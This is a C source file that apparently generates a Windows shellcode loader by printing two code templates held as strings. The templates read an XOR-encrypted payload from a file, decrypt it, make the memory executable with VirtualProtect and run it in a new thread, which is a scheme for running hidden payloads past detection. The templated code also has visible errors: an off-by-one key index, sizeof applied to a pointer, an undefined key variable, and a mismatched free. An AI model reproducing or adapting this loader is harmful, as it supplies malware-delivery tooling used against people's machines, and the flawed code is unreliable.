#include <stdio.h>
#include <Windows.h>


const char* _xorFunction =
"// Ab4y98 : github.com/Ab4y98\n"
"\n"
"#include <windows.h>\n"
"#include <iostream>\n"
"#include <string>\n"
"\n"
"\n"
"// Function to load shellcode from a file into memory\n"
"unsigned char* LoadShellcode(LPCWSTR filePath, DWORD* size) {\n"
"    // Open the file containing the shellcode\n"
"    HANDLE hFile = CreateFile(\n"
"        filePath,                 // File name\n"
"        GENERIC_READ,             // Access mode\n"
"        0,                        // No sharing\n"
"        NULL,                     // No security\n"
"        OPEN_EXISTING,            // Open the file if it exists\n"
"        FILE_ATTRIBUTE_NORMAL,    // Nosrmal file attributes\n"
"        NULL                      // No template file\n"
"    );\n"
"\n"
"    if (hFile == INVALID_HANDLE_VALUE) {\n"
"        printf(\"Failed to open file, error %lu\\n\", GetLastError());\n"
"        return NULL;\n"
"    }\n"
"\n"
"    // Get the size of the file\n"
"    *size = GetFileSize(hFile, NULL);\n"
"    if (*size == INVALID_FILE_SIZE) {\n"
"        printf(\"Failed to get file size, error %lu\\n\", GetLastError());\n"
"        CloseHandle(hFile);\n"
"        return NULL;\n"
"    }\n"
"\n"
"    // Allocate memory for the shellcode\n"
"    unsigned char* buffer = (unsigned char*)malloc(*size);\n"
"    if (buffer == NULL) {\n"
"        printf(\"Failed to allocate memory\\n\");\n"
"        CloseHandle(hFile);\n"
"        return NULL;\n"
"    }\n"
"\n"
"    // Read the shellcode from the file into the buffer\n"
"    DWORD bytesRead;\n"
"    if (!ReadFile(hFile, buffer, *size, &bytesRead, NULL)) {\n"
"        printf(\"Failed to read file, error %lu\\n\", GetLastError());\n"
"        free(buffer);\n"
"        CloseHandle(hFile);\n"
"        return NULL;\n"
"    }\n"
"\n"
"    // Close the file handle\n"
"    CloseHandle(hFile);\n"
"\n"
"    return buffer;  // Return the buffer containing the shellcode\n"
"}\n"
"\n"
"\n"
"VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {\n"
"\n"
"    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {\n"
"        // if end of the key, start again\n"
"        if (j > sKeySize)\n"
"        {\n"
"            j = 0;\n"
"        }\n"
"        pShellcode[i] = pShellcode[i] ^ bKey[j];\n"
"\n"
"    }\n"
"\n"
"}\n"
"\n"
;



const char* _mainFunction =
"int main() {\n"
"\n"
"    DWORD shellcodeSize = 0;\n"
"    unsigned char* shellcode = LoadShellcode(L\"shellcode_enc.bin\", &shellcodeSize);\n"
"    printf(\"Shellcode Address: %p\\n\", shellcode);\n"
"\n"
"\n"
"    if (shellcode != NULL) {\n"
"        // Optionally, you can print the loaded shellcode in hexadecimal for verification\n"
"        printf(\"Encrypted Shellcode loaded: \");\n"
"        for (DWORD i = 0; i < shellcodeSize; i++) {\n"
"            printf(\"%02x \", shellcode[i]);\n"
"        }\n"
"        printf(\"\\n\");\n"
"\n"
"        printf(\"[#] Press <Enter> To Continue ... \");\n"
"        getchar();\n"
"\n"
"        XorByInputKey(PBYTE(shellcode), shellcodeSize, PBYTE(key), sizeof(key));\n"
"\n"
"        printf(\"Decrypted Shellcode loaded: \");\n"
"        for (DWORD i = 0; i < shellcodeSize; i++) {\n"
"            printf(\"%02x \", shellcode[i]);\n"
"        }\n"
"        printf(\"\\n\");\n"
"\n"
"        DWORD dwOldProtection = NULL;\n"
"\n"
"        if (!VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"            printf(\"[!] VirtualProtect Failed With Error : %d \\n\", GetLastError());\n"
"            return -1;\n"
"        }\n"
"\n"
"        printf(\"[#] Press <Enter> To Run ... \");\n"
"        getchar();\n"
"        if (CreateThread(NULL, NULL, LPTHREAD_START_ROUTINE(shellcode), NULL, NULL, NULL) == NULL) {\n"
"            printf(\"[!] CreateThread Failed With Error : %d \\n\", GetLastError());\n"
"            return -1;\n"
"        }\n"
"\n"
"        HeapFree(GetProcessHeap(), 0, shellcode);\n"
"        printf(\"[#] Press <Enter> To Quit ... \");\n"
"        getchar();\n"
"\n"
"        return 0;\n"
"    }\n"
"}\n"
"\n"
;


VOID printFunction(IN INT funcName) {
	switch (funcName) {
	case 1:
		printf("%s\n", _xorFunction);
		break;
	case 2:
		printf("%s\n", _mainFunction);
		break;
	}
		
	
}